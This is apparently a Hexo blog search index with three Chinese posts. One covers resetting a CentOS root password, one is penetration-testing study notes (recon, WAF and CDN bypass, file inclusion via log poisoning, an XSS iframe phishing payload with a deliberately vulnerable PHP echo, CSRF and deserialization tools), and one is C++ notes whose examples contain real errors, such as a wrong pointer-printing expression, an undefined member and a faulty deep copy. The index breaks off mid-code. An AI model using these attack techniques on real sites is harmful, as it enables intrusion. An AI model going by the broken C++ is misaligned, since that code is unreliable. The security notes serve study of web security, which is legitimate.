<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CentOS</title>
    <link href="/2025/07/04/CentOS/"/>
    <url>/2025/07/04/CentOS/</url>
    
    <content type="html"><![CDATA[<h1 id="CenOS-7-忘记密码root密码"><a href="#CenOS-7-忘记密码root密码" class="headerlink" title="CenOS 7 忘记密码root密码"></a>CenOS 7 忘记密码root密码</h1><p>看了很多文章，很多并不适用，终于终于实现了</p><h2 id="1-重启虚拟机"><a href="#1-重启虚拟机" class="headerlink" title="1.重启虚拟机"></a>1.重启虚拟机</h2><p>CTRL+R重启客户机</p><h2 id="2-进入编辑模式"><a href="#2-进入编辑模式" class="headerlink" title="2.进入编辑模式"></a>2.进入编辑模式</h2><p><img src="D:\HEXO\hexo-blog\source_posts\CentOS\1.png" alt="image-20250704103040926"></p><p>保证鼠标在这个虚拟机内部，按↑   ↓键选择，选中第一个按 “ e ”，进入编辑模式</p><h3 id="3-配置界面"><a href="#3-配置界面" class="headerlink" title="3.配置界面"></a>3.配置界面</h3><p>一直按↓找到<code>LANG=*****     </code>，此处可能有的人是zh_CN，可以改为en_US，不改也可以，后面好像会出现白色方块</p><p><img src="D:\HEXO\hexo-blog\source_posts\CentOS\2.png" alt="image-20250704103755228"></p><p>在后面输入<code>init=/bin/sh</code>，注：先打个空格在输入，紧接着按<strong>CTRL+x</strong></p><h2 id="4-单用户界面"><a href="#4-单用户界面" class="headerlink" title="4.单用户界面"></a>4.单用户界面</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">输入<span class="hljs-built_in">mount</span> <span class="hljs-literal">-o</span> remount,rw /<br>按回车<br>passwd<br>输入新密码，回车，再次输入   注：你输入的新密码，不会显示出来<br></code></pre></td></tr></table></figure><p>D:\HEXO\hexo-blog\source_posts\</p><p><img src="D:\HEXO\hexo-blog\source_posts\CentOS\3.png" alt="image-20250704104608443"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<span class="hljs-built_in">touch</span> /.autorelabel <br>再输入<span class="hljs-built_in">exec</span> /sbin/init<br></code></pre></td></tr></table></figure><p>等着重启就可以了，进入后使用root 用户，输入刚修改的密码登录</p>]]></content>
    
    
    <categories>
      
      <category>problem</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CenOS7</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透</title>
    <link href="/2025/04/09/%E6%B8%97%E9%80%8F/"/>
    <url>/2025/04/09/%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th>备案查询</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><h2 id="网站空间"><a href="#网站空间" class="headerlink" title="网站空间"></a>网站空间</h2><h3 id="quake"><a href="#quake" class="headerlink" title="quake"></a>quake</h3><p><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p><h3 id="鹰图"><a href="#鹰图" class="headerlink" title="鹰图"></a>鹰图</h3><p><a href="https://hunter.qianxin.com/">鹰图平台(hunter)-奇安信网络空间测绘系统</a></p><h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><p><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><h2 id="JS框架"><a href="#JS框架" class="headerlink" title="JS框架"></a>JS框架</h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>分类：</p><ul><li>云WAF:百度云、阿里云、华为云……</li><li>软件WAF：宝塔、安全狗、D盾</li><li>硬件WAF：绿盟、安恒……</li><li>代码级WAF：自己写的waf规则</li></ul><p>识别：</p><ul><li>看图识别(拦截界面)</li><li>工具项目</li></ul><p>identywaf</p><p>wafw00f</p><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>分类：低中高交互蜜罐</p><p>功能：web、数据库、工控</p><h3 id="项目识别"><a href="#项目识别" class="headerlink" title="项目识别"></a>项目识别</h3><p>Heimdallr</p><p><a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a></p><p>360 quake_rs</p><p><a href="https://github.com/360quake/quake_rs">https://github.com/360quake/quake_rs</a></p><h3 id="人工识别"><a href="#人工识别" class="headerlink" title="人工识别"></a>人工识别</h3><ul><li>端口多且有规律性</li><li>Web访问协议就下载</li><li>设备指纹对应分析</li></ul><blockquote><p>注：如果是真实的网站，正常不会访问；而蜜罐会记录，利用jsonp传输数据，如果通过web协议访问这个网站，就会下载</p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>识别</p><ul><li>多地ping</li><li>nslookup</li></ul><p>绕过</p><ul><li>子域名</li><li>国外访问</li><li>全网扫描</li><li>反向获取：漏洞利用、邮件系统、遗留文件</li></ul><p>工具：</p><p>超级ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><a href="https://www.17ce.com/">https://www.17ce.com</a></p><p>接口查询：<a href="https://get-site-ip.com/%E6%88%96%E8%80%85fofa">https://get-site-ip.com/或者fofa</a></p><h2 id="语言框架"><a href="#语言框架" class="headerlink" title="语言框架"></a>语言框架</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>ThinkPHP</p><p>Laravel</p><p>Yii</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Django</p><p>flask</p><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><p>常见有漏洞的组件：</p><ul><li><p>SpringBoot</p></li><li><p>Shiro</p></li><li><p>Solr</p></li><li><p>log4j</p></li></ul><h2 id="主机服务器"><a href="#主机服务器" class="headerlink" title="主机服务器"></a>主机服务器</h2><p>端口状态：close、open、filtered</p><p>工具：</p><ul><li>nmap（建议）</li><li>masscan</li><li>网络空间</li></ul><p>意外环境：</p><ul><li>防火墙</li><li>内网</li></ul><h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><h3 id="URL备案查询APP"><a href="#URL备案查询APP" class="headerlink" title="URL备案查询APP"></a>URL备案查询APP</h3><ol><li>查询备案</li><li>网站上有app下载</li><li>市场直接搜单位名称</li></ol><p>抓包表现的数据</p><p>没有误报、无法完整</p><p><strong>提取信息—静态分析</strong></p><ol><li>MobSF</li></ol><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><blockquote><p>下面的基本上直接劝退</p></blockquote><h2 id="解析方案"><a href="#解析方案" class="headerlink" title="解析方案"></a>解析方案</h2><h3 id="执行权限"><a href="#执行权限" class="headerlink" title="执行权限*"></a>执行权限*</h3><p>文件上传后存储目录不给执行权限——当上传后，访问时出现403禁止访问</p><p>有可能绕过，其一般是一个文件目录有限制。可以尝试将文件上传至另一个目录，再尝试</p><h3 id="解码还原"><a href="#解码还原" class="headerlink" title="解码还原"></a>解码还原</h3><ul><li><p>上传——图片利用base64编码存储，</p></li><li><p>显示——解码数据还原</p></li></ul><p>使图片<strong>没有格式后缀</strong>，所以数据由解析只能由其固定的协议去解析</p><p>其利用特定的<code>固定协议</code>，如：data:image&#x2F;png:base64,base的数据</p><h2 id="存储安全"><a href="#存储安全" class="headerlink" title="存储安全"></a>存储安全</h2><h3 id="分站存储"><a href="#分站存储" class="headerlink" title="分站存储"></a>分站存储</h3><p>此分站一般将权限设置为不能执行，只做存储</p><h3 id="对象存储OSS"><a href="#对象存储OSS" class="headerlink" title="对象存储OSS"></a>对象存储OSS</h3><p>不限制上传格式，只存储</p><p>一般访问时就直接下载</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞的原因：</p><ul><li><p>使用文件函数</p></li><li><p>包含的文件可控</p></li></ul><p>PHP：include、require、include_once、require_once、</p><p>JAVA：java.io、File、java.io.FileReader</p><p>ASP.NET：System.IO.FileStream、System.IO.StreamReader</p><ul><li><p>分类：本地包含、远程包含</p></li><li><p>差异：代码过滤(过滤关键字)、配置开关(远程包含开关关了)——<code>allow_url_include=off</code></p></li></ul><p><strong>危害：</strong></p><p>本地包含：</p><p>​     1、有文件利用：上传一个文件  文件写有我们的恶意代码(配合文件上传)</p><p>​     2、无文件利用：</p><p>​                   1、 包含日志文件的利用</p><p>​                   2、  包含session文件利用</p><p>​                   3、 伪协议玩法利用</p><p>远程包含：在远程网站上上传一个后门文件，在目标网站包含远程网站的文件</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h3 id="文件读入"><a href="#文件读入" class="headerlink" title="文件读入"></a>文件读入</h3><h3 id="文件执行"><a href="#文件执行" class="headerlink" title="文件执行"></a>文件执行</h3><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>默认路径：<code>/var/log/nginx/access.log</code></p><p>访问日志文件，观察日志中记录内容，通过抓包修改日志中保存的内容(后门，恶意代码)，以此来达到目的</p><h2 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h2><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>原理：<em><strong>接收数据，输出数据，解析执行</strong></em></p><p>观察可以修改的数据输出的地方</p><p>-交互的地方：交互越多</p><ul><li><p>get、post、header</p></li><li><p>反馈与浏览</p></li><li><p>富文本编辑器</p></li><li><p>各类标签插入和自定义</p></li></ul><p>-数据输出的地方</p><ul><li><p>用户资料</p></li><li><p>数据输出</p></li><li><p>评论留言</p></li><li><p>文件上传、关键词、标签</p></li></ul><h2 id="反射型-非持续"><a href="#反射型-非持续" class="headerlink" title="反射型(非持续)"></a>反射型(非持续)</h2><p>攻击者自己构造的，需攻击者主动发出 </p><p>eg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">后台文件：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">前端利用<br><span class="hljs-attr">https</span>:<span class="hljs-comment">//www.example.com/?x=&lt;iframe src=&quot;www.example.com&quot;&gt;test&lt;/iframe&gt;//钓鱼</span><br></code></pre></td></tr></table></figure><h2 id="存储型-持续"><a href="#存储型-持续" class="headerlink" title="存储型(持续)"></a>存储型(持续)</h2><p>数据存储，评论区、用户资料、文件上传、关键词、标签，<strong>危害大</strong></p><p>有可能存在标签，并不一定能够直接显示</p><p>常见标签：<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782?ops_request_misc=%7B%22request_id%22:%22a410d727e3cfc9d21c009d78bc53a3de%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=a410d727e3cfc9d21c009d78bc53a3de&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-116462782-null-null.142%5Ev102%5Econtrol&utm_term=xss%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E5%8F%8A%E4%BD%9C%E7%94%A8&spm=1018.2226.3001.4187">XSS跨站脚本攻击实例与防御策略-CSDN博客</a></p><p><strong>XSS-labs</strong></p><h2 id="黑盒XSS手工分析"><a href="#黑盒XSS手工分析" class="headerlink" title="黑盒XSS手工分析"></a>黑盒XSS手工分析</h2><p>1、页面中显示的数据找可控的(有些是隐藏的)</p><p>2、利用可控的地方发送JS代码去看执行的加载情况</p><p>3、成功执行即XSS，不能成功就看语句输出的地方的回显</p><p>4、根据回显分析为何不能执行(实体化[htmlspecialchars($str)函数]，括号括起来，关键字被过滤)</p><p><strong>工具</strong>XSStrike</p><a src="http://github/"><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造</p><p>条件</p><ul><li>需要请求数据包</li><li>无过滤防护，或可以绕过</li><li>受害者要触发</li></ul><h2 id="无防护"><a href="#无防护" class="headerlink" title="无防护"></a>无防护</h2><h2 id="Referer同源"><a href="#Referer同源" class="headerlink" title="Referer同源"></a>Referer同源</h2><p>检测referer字段</p><p>全部对比(严谨)：一一对应—》配合xss或文件上传（触发数据包保证是同一来源）</p><p>匹配对比：有这个值</p><blockquote><p>注：条件：点击过来的</p></blockquote><p>逻辑判断：检测来源为空时，返回真</p><h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>对方浏览器一直更新，所以对比不上，代码失效</p><p>安全问题：</p><ul><li>复用</li><li>删除</li><li>置空 token&#x3D;</li></ul><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="CVE绕过-字符串逃逸"><a href="#CVE绕过-字符串逃逸" class="headerlink" title="CVE绕过&amp;&amp;字符串逃逸"></a>CVE绕过&amp;&amp;字符串逃逸</h2><h2 id="开发框架-payload生成项目"><a href="#开发框架-payload生成项目" class="headerlink" title="开发框架&amp;&amp;payload生成项目"></a>开发框架&amp;&amp;payload生成项目</h2><p>NotSoSecute</p><p><a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></p><p>支持：Java、.NET、PHP、Python</p><p>PHPGGC</p><p><a href="https://github.com/NotSoSecure/ambionics/phpggc">https://github.com/NotSoSecure/ambionics/phpggc</a></p><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1>]]></content>
    
    
    <categories>
      
      <category>sec</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++学习</title>
    <link href="/2025/03/16/C-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/16/C-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="从函数返回数组"><a href="#从函数返回数组" class="headerlink" title="从函数返回数组"></a>从函数返回数组</h1><h2 id="静态数组"><a href="#静态数组" class="headerlink" title="静态数组"></a>静态数组</h2><p>在函数内部创建一个静态数组，并将其地址返回</p><p>eg：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>*<span class="hljs-title">myfunction</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> a[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>*p;<br>    p=<span class="hljs-built_in">myfunction</span>();<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)<br>    &#123;<br>        cout&lt;&lt;*<span class="hljs-string">&quot;(p+&quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;)&quot;</span>&lt;&lt;endl;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="动态分配数组"><a href="#动态分配数组" class="headerlink" title="动态分配数组"></a>动态分配数组</h2><p>动态分配数组需要在函数内部使用 new 运算符来分配一个数组，并在函数结束时使用 delete 运算符释放该数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> *<span class="hljs-title">myfunction</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *a=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)<br>    &#123;<br>        a[i]=i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> *p;<br>    p=<span class="hljs-built_in">myfunction</span>();<br>    <span class="hljs-keyword">delete</span>[] p;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><h2 id="指向字符的指针数组"><a href="#指向字符的指针数组" class="headerlink" title="指向字符的指针数组"></a>指向字符的指针数组</h2><p>在C++中，你可以使用一个指向字符的指针数组来存储一个字符串列表。每个指针指向一个字符串（即字符数组</p><h2 id="从函数返回指针"><a href="#从函数返回指针" class="headerlink" title="从函数返回指针"></a>从函数返回指针</h2><p><strong>C++ 不支持在函数外返回局部变量的地址，除非定义局部变量为 static变量。</strong></p><p>eg:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*它会生成 10 个随机数，并使用表示指针的数组名（即第一个数组元素的地址）来返回它们*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span>*<span class="hljs-title">getrandom</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>((<span class="hljs-type">unsigned</span>)<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> a[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>    &#123;<br>        a[i]=<span class="hljs-built_in">rand</span>()%<span class="hljs-number">100</span>;<br>&#125;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span>*p;<br>    p=<span class="hljs-built_in">getrandom</span>();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>    &#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;*(p+&quot;</span>&lt;&lt;i&lt;&lt;<span class="hljs-string">&quot;)&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><h1 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h1><h2 id="拷贝构造函数的调用时机"><a href="#拷贝构造函数的调用时机" class="headerlink" title="拷贝构造函数的调用时机"></a>拷贝构造函数的调用时机</h2><h3 id="1、用已构造的对象来初始化一个新的对象"><a href="#1、用已构造的对象来初始化一个新的对象" class="headerlink" title="1、用已构造的对象来初始化一个新的对象"></a>1、用已构造的对象来初始化一个新的对象</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<span class="hljs-comment">//使用括号法初始化</span><br><span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="2、值传递的方式"><a href="#2、值传递的方式" class="headerlink" title="2、值传递的方式"></a>2、值传递的方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">(person p)</span></span><br><span class="hljs-function"></span>&#123;<br>……<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br><span class="hljs-built_in">test</span>(p1);<br>&#125;<br></code></pre></td></tr></table></figure><p>实参传给形参时会拷贝出一个新的变量</p><h3 id="3、值返回的返回"><a href="#3、值返回的返回" class="headerlink" title="3、值返回的返回"></a>3、值返回的返回</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">person <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p1;<br>    <span class="hljs-keyword">return</span> p1;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p=<span class="hljs-built_in">test</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>调用test 函数时，会先使用构造函数生成p1，再调用拷贝构造函数让p1拷贝给一个临时变量p1’ (假设临时变量为 <strong>p1’</strong> )再将p1’传给p，此时已经从test函数作用域出来，调用析构函数先后去除p1’和p1。</p><h1 id="构造函数调用规则"><a href="#构造函数调用规则" class="headerlink" title="构造函数调用规则"></a>构造函数调用规则</h1><h1 id="浅拷贝与深拷贝"><a href="#浅拷贝与深拷贝" class="headerlink" title="浅拷贝与深拷贝"></a>浅拷贝与深拷贝</h1><p><em>问题引入</em></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br>    <span class="hljs-type">int</span> m_age;<br>    <span class="hljs-type">int</span> *m_height;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>()<br>    &#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;无参构造函数调用&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age,<span class="hljs-type">int</span> height)<br>    &#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;有参构造函数调用&quot;</span>&lt;&lt;endl;    <br>        m_age=age;<br>        m_height=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span> (height);<br>    &#125;<br>    ~<span class="hljs-built_in">Person</span>()<br>    &#123;<br>        <span class="hljs-comment">//将堆区数据释放</span><br>        <span class="hljs-keyword">if</span>(m_height!=<span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">delete</span> m_height;<br>            m_height=<span class="hljs-literal">NULL</span>;<br>        &#125;<br>         cout&lt;&lt;<span class="hljs-string">&quot;析构函数调用&quot;</span>&lt;&lt;endl;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">180</span>)</span></span>;<br>    cout&lt;&lt;<span class="hljs-string">&quot;p1的年龄&quot;</span>&lt;&lt;p<span class="hljs-number">1.</span>age&lt;&lt;<span class="hljs-string">&quot;    p1的身高&quot;</span>&lt;&lt;*p<span class="hljs-number">1.</span>m_height&lt;&lt;endl;<br>    <span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(p1)</span></span>;<br>    cout&lt;&lt;<span class="hljs-string">&quot;p2的年龄&quot;</span>&lt;&lt;p<span class="hljs-number">2.</span>age&lt;&lt;<span class="hljs-string">&quot;    p2的身高&quot;</span>&lt;&lt;*p<span class="hljs-number">2.</span>m_height&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为构造函数在使用new来构造一个height对象，所以应在调用完后，使用delete来释放空间，因此要在析构函数中加上delete。(第19—24行)</p><p>此时在运行时就会崩掉……</p><p><em>原因</em></p><p>当属性在堆区开辟时，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p><h2 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h2><p>简单的复制拷贝</p><h2 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h2><p>在堆区重新申请空间，进行拷贝操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; a)<br>&#123;<br>    age=a.age;<br>    height=<span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(a.height);<span class="hljs-comment">//如果不在堆区创建新的内存，会导致浅拷贝带来的重复释放堆区问题</span><br>&#125;<br><span class="hljs-comment">//自己定义一个拷贝构造函数</span><br></code></pre></td></tr></table></figure><h1 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h1><blockquote><p>语法：<code>构造函数():属性1(值1),属性2(值2),属性3(值3)……&#123;&#125;</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 